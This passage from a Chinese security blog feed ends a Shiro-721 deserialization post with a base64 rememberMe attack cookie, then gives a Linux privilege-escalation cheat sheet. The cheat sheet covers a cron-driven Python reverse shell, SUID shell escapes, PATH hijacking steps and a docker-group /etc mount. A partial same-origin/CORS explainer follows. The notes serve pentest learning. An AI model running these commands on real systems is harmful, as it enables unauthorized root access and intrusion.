<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/720-padding-cookie.png" alt="720-padding-cookie"></p>
<ul>
<li>使用构造的rememberMe攻击字符串重新请求网站</li>
</ul>
<p><img src="/images/middleware/shiro/721-burp-rememberMe.png" alt="721-burp-rememberMe"></p>
<ul>
<li>成功触发payload，在DNSlog获取到目标IP</li>
</ul>
<p><img src="/images/middleware/shiro/721-dnslog-result.png" alt="721-dnslog-result"></p>
<ul>
<li>▲ 2020-08-22 因为环境问题，多次复现均存在问题，所以用<code>ping cedp81j.dnslog.cn</code>来代替，猜测原因如下<ul>
<li>payload过长，blocksize错误</li>
<li>环境为Shiro-550的环境，无法复现Shiro-721的实验</li>
</ul>
</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://www.cnblogs.com/loong-hon/p/10619616.html" target="_blank" rel="noopener">Apache Shiro Java反序列化漏洞分析</a></li>
<li><a href="https://www.cnblogs.com/kbhome/p/13061633.html" target="_blank" rel="noopener">shiro java 反序列漏洞复现</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/13239046.html" target="_blank" rel="noopener">Shiro反序列化漏洞利用汇总（Shiro-550+Shiro-721）</a></li>
<li><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088" target="_blank" rel="noopener">Shiro反序列化漏洞</a></li>
<li><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">Padding oracle attack详细解析</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>Linux提权</title>
    <url>/2020/08/20/linux_privilege_escalation/</url>
    <content><![CDATA[<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><h3 id="0X00-内核漏洞提权"><a href="#0X00-内核漏洞提权" class="headerlink" title="0X00 内核漏洞提权"></a>0X00 内核漏洞提权</h3><ul>
<li>查看发行版<ul>
<li><code>cat /etc/issue</code></li>
<li><code>cat /etc/*-release</code></li>
</ul>
</li>
<li>查看内核版本<ul>
<li><code>uname -a</code></li>
</ul>
</li>
<li>查看已经安装的程序<ul>
<li><code>dpkg -l</code></li>
<li><code>rpm -qa</code></li>
</ul>
</li>
<li>利用方法<ul>
<li>现有存在的exp，可以获得root权限：<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
<li>使用Linux的Searchexploit Linux版本</li>
<li>▲ 注：很多Linux的机子都存在脏牛提权漏洞 </li>
</ul>
</li>
</ul>
<h3 id="0X01-明文root密码提权"><a href="#0X01-明文root密码提权" class="headerlink" title="0X01 明文root密码提权"></a>0X01 明文root密码提权</h3><ul>
<li>passwd、shadow<ul>
<li>passwd储存了用户，全用户可读，root可写</li>
<li>shadow存储密码的hash，仅root可独写</li>
</ul>
</li>
<li>提权前提<ul>
<li>passwd可写  -&gt;   将passwd的root密码X替换为我们自己的hash</li>
<li>shadow可读  -&gt;   把shadow里面root的hash辅助出来，用hash、john爆破</li>
</ul>
</li>
<li>▲ 2020-08-05高版本Linux无法进行修改，默认情况普通用户passwd不可写，shadow不可读</li>
</ul>
<h3 id="0X02-密码复用"><a href="#0X02-密码复用" class="headerlink" title="0X02 密码复用"></a>0X02 密码复用</h3><ul>
<li>数据库或者Web后台的密码就是root密码</li>
</ul>
<h3 id="0X03-sudo提权滥用"><a href="#0X03-sudo提权滥用" class="headerlink" title="0X03 sudo提权滥用"></a>0X03 sudo提权滥用</h3><ul>
<li>sudo是让普通用户使用超级用户的命令，其配置文件为/etc/sudoers，文件定义可以执行sudo的账户、定义某个应用程序用root访问、是否需要密码验证</li>
<li>通过<code>sudo -l</code>来查看是否具有sudo权限或者通过<code>groups</code>查看组是否具有允许sudo命令权限</li>
</ul>
<p><img src="/images/privilge/linux-sudo-l.png" alt="linux-sudo-l"></p>
<h5 id="su-root被禁止"><a href="#su-root被禁止" class="headerlink" title="su root被禁止"></a>su root被禁止</h5><ul>
<li>原因：Linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin），所以sudo在输入密码的时候本质上是读取了键盘，而不是读取bash里面输入的字符</li>
<li>解决方法：使用python加载一个pty<ul>
<li><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
</ul>
</li>
<li>▲ 转换为交互式shell以及终端型shell的方法还有很多，python是最简单一种，但需要python环境才可以执行转换</li>
</ul>
<p><img src="/images/privilge/linux-su-sudo.PNG" alt="linux-su-sudo"></p>
<h3 id="0X04-计划任务"><a href="#0X04-计划任务" class="headerlink" title="0X04 计划任务"></a>0X04 计划任务</h3><ul>
<li>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限</li>
<li>前提<ul>
<li>可列出/etc内系统的计划任务</li>
<li>程序默认是以root权限执行</li>
<li>其中一个脚本配置成任意用户可写</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-cron-root.png" alt="linux-cron-root"></p>
<ul>
<li>修改脚本为自己执行的内容 /etc/cron.d/py_reverse_shell<ul>
<li>脚本的意思为，每两分钟root用户执行一次test目录下的python脚本</li>
</ul>
</li>
</ul>
<p><code>*/2 * * * * root python3.8 /home/test/py_reverse_shell.py</code></p>
<p><img src="/images/privilge/linux-crond.png" alt="linux-crond"></p>
<ul>
<li>py_reverse_shell.py，常用的python反弹sh的shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"127.0.0.1"</span>,<span class="number">1234</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>

<p><img src="/images/privilge/linux-reverse-py.jpg" alt="linux-reverse-py"></p>
<ul>
<li>使用低权限的用户开启nc监听端口，2分钟后即可获取到root的sh的shell</li>
</ul>
<p><img src="/images/privilge/linux-cron-reverse-nc.png" alt="linux-cron-reverse-nc"></p>
<h3 id="0X05-SUID提权"><a href="#0X05-SUID提权" class="headerlink" title="0X05 SUID提权"></a>0X05 SUID提权</h3><ul>
<li>概要<ul>
<li>SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行</li>
</ul>
</li>
<li>文件权限命令<ul>
<li>SUID：chmod u+s file</li>
</ul>
</li>
<li>查看SUID文件<ul>
<li>find / -user root -perm -4000 -print 2&gt;/dev/null</li>
<li>find / -perm -u=s -type f 2&gt;/dev/null</li>
</ul>
</li>
</ul>
<h5 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h5><ul>
<li><code>find examples.desktop exec whoami \;</code><ul>
<li>▲ 如果有python环境，则可以直接python反弹命令</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-suid-find.PNG" alt="linux-suid-find"></p>
<h5 id="其他SUID权限命令"><a href="#其他SUID权限命令" class="headerlink" title="其他SUID权限命令"></a>其他SUID权限命令</h5><ul>
<li>bash<ul>
<li>bash -p</li>
</ul>
</li>
<li>less<ul>
<li>less /etc/passwd</li>
<li>!/bin/sh</li>
</ul>
</li>
<li>awk<ul>
<li>awk ‘BEGIN {system(“/bin/bash -p”)}’</li>
</ul>
</li>
<li>csh<ul>
<li>csh -b</li>
</ul>
</li>
<li>dmesg<ul>
<li>dmesg -H</li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>man<ul>
<li>man man </li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>more<ul>
<li>more /etc/profile</li>
<li>!/bin/sh -p</li>
</ul>
</li>
<li>▲ 具有SUID权限的命令执行系统命令有很多，详细见参考链接的文章</li>
</ul>
<h3 id="0X06-劫持环境变量进行提权"><a href="#0X06-劫持环境变量进行提权" class="headerlink" title="0X06 劫持环境变量进行提权"></a>0X06 劫持环境变量进行提权</h3><ul>
<li>概要<ul>
<li>PATH是Linux和类Unix操作系统中的环境变量，它指定存储可执行程序的bin和sbin目录</li>
<li>当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件</li>
</ul>
</li>
<li>查看当前PATH环境变量：<code>echo $PATH</code><ul>
<li><code>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</code></li>
</ul>
</li>
<li>前提<ul>
<li>可以操作的PATH环境变量</li>
<li>具有suid权限的脚本执行系统命令如<code>ps</code>，<code>id</code>等</li>
</ul>
</li>
<li>测试</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">******************第一步************  root用户或者高权限用户</span><br><span class="line"><span class="built_in">cd</span> /home/tomas</span><br><span class="line">vi demo.c</span><br><span class="line">    <span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">    void main()</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">"ps"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line"></span><br><span class="line">******************第二步************  低权限用户</span><br><span class="line">ECHO命令：</span><br><span class="line">    <span class="built_in">cd</span> /tmp</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"/bin/bash"</span> &gt; ps</span><br><span class="line">    chmod 777 ps</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">cd</span> /home/tomas</span><br><span class="line">    ./shell</span><br><span class="line">    whoami</span><br><span class="line">COPY命令：</span><br><span class="line">    <span class="built_in">cd</span> /home/tomas</span><br><span class="line">    cp /bin/bash</span><br><span class="line">    sh /tmp/ps</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">    <span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">    ./shell</span><br><span class="line">    whoami</span><br><span class="line">SYMLINK命令：</span><br><span class="line">    ln -s /bin/sh ps</span><br><span class="line">    <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">    ./shell</span><br><span class="line">    id</span><br><span class="line">    whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/privilge/linux-path-echo.PNG" alt="linux-path-echo"></p>
<p><img src="/images/privilge/linux-path-copy.PNG" alt="linux-path-copy"></p>
<p><img src="/images/privilge/linux-path-symlink.PNG" alt="linux-path-symlink">   </p>
<h3 id="0X07-docker组提权"><a href="#0X07-docker组提权" class="headerlink" title="0X07 docker组提权"></a>0X07 docker组提权</h3><h5 id="docker组成员运行docker"><a href="#docker组成员运行docker" class="headerlink" title="docker组成员运行docker"></a>docker组成员运行docker</h5><ul>
<li>默认情况下使用docker必须要有sudo权限</li>
<li>只需要管理员将需要使用docker的用户添加到docker用户组中，用户重新登录机器即可免sudo使用docker了</li>
</ul>
<h5 id="docker容器内用户权限为root"><a href="#docker容器内用户权限为root" class="headerlink" title="docker容器内用户权限为root"></a>docker容器内用户权限为root</h5><ul>
<li>用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置</li>
</ul>
<h5 id="docker文件映射方便容器内外文件共享"><a href="#docker文件映射方便容器内外文件共享" class="headerlink" title="docker文件映射方便容器内外文件共享"></a>docker文件映射方便容器内外文件共享</h5><ul>
<li>docker提供了一个-v选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享</li>
</ul>
<h5 id="docker提权步骤"><a href="#docker提权步骤" class="headerlink" title="docker提权步骤"></a>docker提权步骤</h5><ul>
<li>在docker组的用户，但不具有sudo组的权限，创建一个容器<ul>
<li><code>docker run -it --rm -v /etc:/etc xxx /bin/bash</code>   #异常使用，共享外部文件/etc</li>
<li><code>adduser test1</code>   # 使用容器内的root权限创建一个test1用户</li>
<li><code>usermod -aG sudo test1</code>  # 将该用户赋予sudo权限</li>
</ul>
</li>
<li>进行提权<ul>
<li><code>Ctrl+D</code>  # 退出容器到host</li>
<li><code>cat /etc/passwd</code>  # 发现新增了用户test1</li>
<li><code>su test1</code>  # 切换用户到test1用户</li>
<li><code>groups</code> # 发现test1用户具有sudo组的权限</li>
</ul>
</li>
</ul>
<p><img src="/images/privilge/linux-docker.PNG" alt="linux-docker"></p>
<h5 id="规避措施"><a href="#规避措施" class="headerlink" title="规避措施"></a>规避措施</h5><ul>
<li>对于多个用户想使用容器，可以通过管理员集中创建开启了ssh服务的容器，并提供端口映射到host上，让普通用户通过ssh链接进入容器，这样就可以限制普通用户的活动范围在容器内，用户的任意操作也不会扩散到host上</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">Linux Privilege Escalation Using PATH Variable</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651091670&idx=3&sn=8df01e482e3cad5bec29128d389ead37&chksm=bd1fe05d8a68694b336fb948e0de833b1b1e7bb25a228e3f188d8762276020f304b6f2491b8a&mpshare=1&scene=1&srcid=0805vnaZrUzFk6iQSVhath1O&sharer_sharetime=1596588256066&sharer_shareid=13de7cf246df94cfb693d05988b76aac&key=b21c8bfc2e98d5d8b23ded436e6d4de1d3d39a65f3a44305a57fc5c39817fbccfbdd7702789cf712dadec58c1640ba161271d86c2d8558039af171b9655d4b152861679b0e57297b461c7bd55945f29b&ascene=1&uin=MjYzNzU1MTExOQ%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=AyyflVNz0ZmoNq26aIJSHWs%3D&pass_ticket=9ZbiqJaZM%2BTSww8n%2B5NlblNhuTskf5FAtm2QvX0VLMI9Y05ZlZsRDqPhkMS40B5u" target="_blank" rel="noopener">CentOS 7系统利用suid提权获取Root Shell</a></li>
<li><a href="https://www.freebuf.com/articles/system/173903.html" target="_blank" rel="noopener">在Linux中使用环境变量进行提权</a></li>
<li><a href="https://www.cnblogs.com/BOHB-yunying/articles/11517748.html" target="_blank" rel="noopener">Linux常见提权</a></li>
<li><a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">普通用户借助Docker容器提权思路分享</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1544037" target="_blank" rel="noopener">Linux 提权的各种姿势总结</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1547098" target="_blank" rel="noopener">提权总结以及各种利用姿势</a></li>
</ul>
]]></content>
      <categories>
        <category>Privilge</category>
      </categories>
  </entry>
  <entry>
    <title>SOP_CORS_CSP</title>
    <url>/2020/08/19/sop_cors_csp/</url>
    <content><![CDATA[<h1 id="SOP-CORS-CSP"><a href="#SOP-CORS-CSP" class="headerlink" title="SOP_CORS_CSP"></a>SOP_CORS_CSP</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><ul>
<li>⭐ 阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限</li>
<li>同源的特征<ul>
<li>同协议 如：<a href="https://exp.org" target="_blank" rel="noopener">https://exp.org</a> 与 <a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> 不同源</li>
<li>同端口 如：<a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> 与 <a href="http://exp.org:8080" target="_blank" rel="noopener">http://exp.org:8080</a> 不同源</li>
<li>同域名 如：<a href="http://aaa.org" target="_blank" rel="noopener">http://aaa.org</a> 与 <a href="http://bbb.org" target="_blank" rel="noopener">http://bbb.org</a> 不同源</li>
</ul>
</li>
<li>同源策略的限制<ul>
<li>限制了不同源之间的请求交互，例如在使用XMLHttpRequest或fetch函数时则会受到同源策略的约束</li>
<li>限制浏览器中不同源的框架之间是不能进行js的交互操作的，例如通过iframe和window.open产生的不同源的窗口</li>
</ul>
</li>
<li>同源策略的注解<ul>
<li>对于<code>&lt;a&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;link&gt;</code>这类属性带有src，href的标签，允许跨域加载</li>
<li>跨域请求可以发出，但是浏览器查看返回包发现跨域且无CORS头则会丢弃，而且不同子域之间默认是不同源的</li>
<li>IE未将端口号加入到同源策略的组成部分之中，因此company.com:81/index.html和company.com/index.html属于同源并且不受任何限制</li>
</ul>
</li>
</ul>
<h2 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h2><h3 id="0X00-CORS简介"><a href="#0X00-CORS简介" class="headerlink" title="0X00 CORS简介"></a>0X00 CORS简介</h3><ul>
<li>CORS跨域资源共享（Origin/Access-Control-Allow-Origin）<ul>
<li>AJAX的XMLHttpRequest请求</li>
<li>简单请求（simple request）– HEAD/GET/POST</li>
<li>非简单请求（not-so-simple request）–PUT/OPTIONS</li>
</ul>
</li>
<li>JSONP（JSON with Padding)，应用JSON的一种新方法<ul>
<li>JOSNP允许页面接受另一个域的JSON数据，通过在页面增加一个可以从其它域加载带有回调的JSON响应的<code>&lt;script&gt;</code>标签</li>
</ul>
</li>
<li>代理（通过接口的方式，后台调用php文件获取然后返回给前端）</li>
<li>跨文档通信（postMessage()会异步的触发window上的onmessage事件）</li>
<li>document.domain（解决不同window之间不能进行交互操作的问题）</li>
<li>window.name（window.name在页面的生命周期里共享一个window.name）</li>
<li>WebSocket（浏览器允许脚本直连一个WebSocket地址而不管同源策略）</li>
</ul>
<h3 id="0X01-CORS"><a href="#0X01-CORS" class="headerlink" title="0X01 CORS"></a>0X01 CORS</h3><ul>
<li>▲ CORS头就是为了突破不同源之间的请求交互这一限制而产生的</li>
<li>只要HTTP返回<code>Access-Control-Allow-Origin:http://test2.www.xyz</code>，test2.<a href="http://www.xyz的跨域请求的响应会被浏览器正确的返回" target="_blank" rel="noopener">www.xyz的跨域请求的响应会被浏览器正确的返回</a></li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?</span><br><span class="line">    header(&quot;Access-Control-Allow-Origin:http://test2.www.xyz&quot;);</span><br><span class="line">    echo &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">//Console台输入</span><br><span class="line">fetch(&apos;//test1.www.xyz/1.php&apos;).then(function(data)&#123;</span><br><span class="line">  return data.text()</span><br><span class="line">&#125;).then(function(data)&#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/cors-example.png" alt="cors-example"></p>
<ul>
<li>如果设置<code>Access-Control-Allow-Origin:*</code>，则所有的跨域访问响应都会被允许</li>
<li>如果请求需要带上Cookie，则需要服务器设置<code>Access-Control-Allow-Credentials:true</code><ul>
<li>如果设置<code>Access-Control-Allow-Origin:*</code>，则不管有没有设置<code>Access-Control-Allow-Credentials:true</code>，带Cookie的请求都会失败</li>
</ul>
</li>
</ul>
<h3 id="0X02-document-domain"><a href="#0X02-document-domain" class="headerlink" title="0X02 document.domain"></a>0X02 document.domain</h3><ul>
<li>针对同源策略的第二个限制，不同窗口之间的同源限制</li>
<li>▲ 只适用于顶级域名相同子域名不同之间的同源策略 -&gt; 不同子域名之间默认不同源，但是可以通过设置document.domain为相同的更高级域名，来使不同子域同源</li>
<li>测试代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//不设置document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//test2.www.xtz/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">----test2.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;p</span><br><span class="line"></span><br><span class="line">//设置document.domain</span><br><span class="line">----test1.www.xyz/window_name_1.php</span><br><span class="line">&lt;iframe id=&apos;iframe&apos; src=&quot;//bbb.evoa.me/2.php&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br><span class="line">----test1.www.xyz/window_name_2.php</span><br><span class="line">&lt;h1&gt;123&lt;/h&gt;</span><br><span class="line">&lt;script&gt;document.domain = &quot;www.xyz&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/sop_cors_csp/cors/document-name-alert.png" alt="document-name-alert"></p>
<ul>
<li><p>注释</p>
<ul>
<li><p>document.domain只可以被设置为他的当前域或其当前域的父域</p>
</li>
<li><p>document.domain的赋值操作会导致端口号被重写为NULL，所以test1.<a href="http://www.xyz仅设置document.domain为www.xyz并不能与www.xyz进行通信，www.xyz的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患" target="_blank" rel="noopener">www.xyz仅设置document.domain为www.xyz并不能与www.xyz进行通信，www.xyz的页面也必须赋值一次使双方端口相同从而通过浏览器的同源检测。这么做的目的是，如果子域有XSS，那么他的父域都存在安全隐患</a></p>
</li>
<li><p>同一窗体不同窗口之间（iframe中的或window.open打开的）是能够获取到彼此的window对象的，如iframe.contentWindow可以获取iframe的window对象，但是不同源的情况下这个window对象的大部分属性和方法是受限制的</p>
<p><img src="/images/sop_cors_csp/cors/document-name-cors.png" alt="document-name-cors"></p>
</li>
</ul>
</li>
<li><p>▲ 如果某个子域为了和根域通信，根域设置了document.domain为根域，那么其他子域如果有xss漏洞可以直接跨同源攻击根域和同样设置了document.domain的其他子域</p>
</li>
</ul>
<h3 id="0X03-window-name"><a href="#0X03-window-name" class="headerlink" title="0X03 window.name"></a>0X03 window.name</h3><ul>
<li>window对象有个name属性，该属性有个特征<ul>
<li>在一个窗口(window)的生命周期内，窗口载入的所有的页面都是共享一个window.name的</li>
<li>每个页面对window.name都有读写的权限</li>
<li>window.name是持久存在一个窗口载入过的所有页面中，并不会因新页面的载入而进行重置</li>
</ul>
</li>
<li>▲ window.name几乎不受同源策略的影响</li>
<li>测试代码<ul>
